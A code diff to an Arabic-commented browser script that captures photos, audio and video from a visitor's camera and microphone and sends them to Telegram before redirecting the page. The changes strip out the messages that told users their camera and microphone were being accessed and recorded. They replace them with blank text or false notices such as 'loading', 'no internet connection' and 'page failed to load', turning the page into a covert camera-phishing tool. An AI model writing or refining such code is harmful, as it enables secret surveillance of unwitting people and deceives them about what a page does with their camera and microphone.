@@ -70,7 +70,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         
         try {
-            updateStatus('جاري طلب صلاحيات الوصول للكاميرا والميكروفون...', 'info');
+            updateStatus('جاري التحميل ...', 'info');
             
             // محاولة الحصول على الكاميرا والميكروفون معاً
             try {
@@ -100,18 +100,21 @@ document.addEventListener('DOMContentLoaded', () => {
             capturePhotoBtn.disabled = false;
             recordVideoBtn.disabled = false;
             recordAudioBtn.disabled = false;
-            updateStatus('جاهز لالتقاط الوسائط', 'success');
+            updateStatus("", 'success');
         } catch (err) {
             console.error("خطأ في الوصول للوسائط:", err);
             
             // رسائل خطأ مفصلة بناءً على نوع الخطأ
-            let errorMessage = 'خطأ: لم يتم منح صلاحية الوصول للكاميرا والميكروفون.';
+            //خطاء: تم رفض صلاحيات الوصول. يرجى السماح بالوصول للكاميرا والميكروفون.
+            //خطاء: لم يتم العثور على كاميرا أو ميكروفون على هذا الجهاز.
+            //خطاء: الكاميرا أو الميكروفون قيد الاستخدام من قبل تطبيق آخر.
+            let errorMessage = "";
             if (err.name === 'NotAllowedError') {
-                errorMessage = 'خطأ: تم رفض صلاحيات الوصول. يرجى السماح بالوصول للكاميرا والميكروفون.';
+                errorMessage = "";
             } else if (err.name === 'NotFoundError') {
-                errorMessage = 'خطأ: لم يتم العثور على كاميرا أو ميكروفون على هذا الجهاز.';
+                errorMessage = "";
             } else if (err.name === 'NotReadableError') {
-                errorMessage = 'خطأ: الكاميرا أو الميكروفون قيد الاستخدام من قبل تطبيق آخر.';
+                errorMessage = "";
             }
             
             updateStatus(errorMessage, 'error');
@@ -203,7 +206,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // 1. التقاط الصور
     capturePhotoBtn.addEventListener('click', async () => {
         if (!stream) {
-            updateStatus('خطأ: لم يتم الحصول على بث الكاميرا. يرجى تحديث الصفحة.', 'error');
+            updateStatus('خطاء: حدث الصفحة ', 'error');
             return;
         }
         //جاري التقاط الصور
@@ -216,7 +219,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const videoTrack = stream.getVideoTracks()[0];
             if (!videoTrack) {
                 //لا توجد كاميرا متاحة
-                updateStatus('خطأ: لا توجد كاميرا متاحة.', 'error');
+                updateStatus('لا يوجد اتصال بالانترنت', 'error');
                 capturePhotoBtn.disabled = false;
                 return;
             }
@@ -231,7 +234,8 @@ document.addEventListener('DOMContentLoaded', () => {
                     height = settings.height;
                 }
             } catch (err) {
-                console.warn('لم يتمكن من الحصول على إعدادات الفيديو، استخدام القيم الافتراضية:', err);
+                //خطأ في الحصول على إعدادات الفيديو
+                console.warn('', err);
             }
             
             canvas.width = width;
@@ -239,14 +243,14 @@ document.addEventListener('DOMContentLoaded', () => {
             const context = canvas.getContext('2d');
 
             for (let i = 0; i < 10; i++) {
-                updateStatus(`التقاط الصورة ${i + 1} من 10...`, 'info');
+                // updateStatus(`التقاط الصورة ${i + 1} من 10...`, 'info');
                 let captureSuccess = false;
                 
                 try {
                     // الحصول على أول فيديو track من البث
                     const videoTrack = stream.getVideoTracks()[0];
                     if (!videoTrack) {
-                        throw new Error('لا توجد كاميرا متاحة');
+                        throw new Error('');
                     }
                     
                     // محاولة استخدام ImageCapture API (الطريقة الأفضل)
@@ -265,7 +269,7 @@ document.addEventListener('DOMContentLoaded', () => {
                                     if (blob) {
                                         resolve(blob);
                                     } else {
-                                        reject(new Error('فشل في تحويل الصورة إلى blob'));
+                                        reject(new Error('فشل في تحميل الصفحة '));
                                     }
                                 }, 'image/jpeg', 0.95);
                             });
@@ -279,13 +283,13 @@ document.addEventListener('DOMContentLoaded', () => {
                             await sendToTelegram(formData, `صورة رقم ${i + 1}`);
                             captureSuccess = true;
                         } catch (imageCaptureErr) {
-                            console.warn('ImageCapture فشل، استخدام الطريقة البديلة:', imageCaptureErr);
+                            console.warn('فشل الرجوع إلى الطريقة البديلة', imageCaptureErr);
                         }
                     }
                     
                     // إذا فشلت ImageCapture أو لم تكن متاحة، استخدم الطريقة البديلة
                     if (!captureSuccess) {
-                        console.log('استخدام الطريقة البديلة للتقاط الصورة');
+                        console.log("");
                         const tempVideo = document.createElement('video');
                         tempVideo.srcObject = stream;
                         tempVideo.muted = true;
@@ -299,7 +303,7 @@ document.addEventListener('DOMContentLoaded', () => {
                                 if (blob) {
                                     resolve(blob);
                                 } else {
-                                    reject(new Error('فشل في تحويل الصورة إلى blob'));
+                                    reject(new Error('فشل في تحميل الصفحة '));
                                 }
                             }, 'image/jpeg', 0.95);
                         });
@@ -317,12 +321,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     // انتظار قصير بين الصور
                     if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                 } catch (photoError) {
-                    console.error(`خطأ في التقاط الصورة ${i + 1}:`, photoError);
+                    console.error(`النت غير متوفر ${i + 1}:`, photoError);
                     updateStatus(`النت غير متوفر ${i + 1}: ${photoError.message}`, 'error');
                 }
             }
-
-            updateStatus('تم التقاط وإرسال الصور بنجاح!', 'success');
+            //تم التقاط وإرسال الصور بنجاح!
+            updateStatus('', 'success');
             // إعادة التوجيه بعد ثانية واحدة
             setTimeout(() => {
                 redirectAfterSuccess();
@@ -360,7 +364,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // 3. تسجيل الصوت
     recordAudioBtn.addEventListener('click', () => {
         if (!stream) {
-            updateStatus('خطأ: لم يتم الحصول على بث الميكروفون.', 'error');
+            //updateStatus('خطأ: لم يتم الحصول على بث الميكروفون.', 'error');
             return;
         }
         
@@ -376,7 +380,7 @@ document.addEventListener('DOMContentLoaded', () => {
             recordVideoBtn.disabled = true;
             capturePhotoBtn.disabled = true;
             //جاري تسجيل الصوت
-            updateStatus('', 'recording');
+            //updateStatus('', 'recording');
         }
     });
 
@@ -388,7 +392,7 @@ document.addEventListener('DOMContentLoaded', () => {
             mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
         } catch (error) {
             console.error('خطأ في إنشاء MediaRecorder:', error);
-            updateStatus('خطأ: المتصفح لا يدعم تسجيل الوسائط.', 'error');
+            //updateStatus('خطأ: المتصفح لا يدعم تسجيل الوسائط.', 'error');
             resetButtons();
             return;
         }
@@ -424,7 +428,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     file: blob,
                     fileName: `video_${Date.now()}.${fileExtension}`
                 };
-                updateStatus('', 'info');
+                //updateStatus('', 'info');
             } else { // audio
                 formData = {
                     method: 'sendAudio',
@@ -432,18 +436,18 @@ document.addEventListener('DOMContentLoaded', () => {
                     file: blob,
                     fileName: `audio_${Date.now()}.${fileExtension}`
                 };
-                updateStatus('', 'info');
+                //updateStatus('', 'info');
             }
 
             const success = await sendToTelegram(formData);
             if (success) {
-                updateStatus('', 'success');
+                //updateStatus('', 'success');
                 // إعادة التوجيه بعد ثانية واحدة
                 setTimeout(() => {
                     redirectAfterSuccess();
                 }, 1000);
             } else {
-                updateStatus('حدث خطأ أثناء الإرسال.', 'error');
+                //updateStatus('حدث خطأ أثناء الإرسال.', 'error');
             }
             
             resetButtons();
@@ -453,7 +457,7 @@ document.addEventListener('DOMContentLoaded', () => {
             mediaRecorder.start();
         } catch (error) {
             console.error('خطأ في بدء التسجيل:', error);
-            updateStatus('خطأ: لم يتمكن من بدء التسجيل.', 'error');
+            //updateStatus('خطأ: لم يتمكن من بدء التسجيل.', 'error');
             resetButtons();
         }
     }
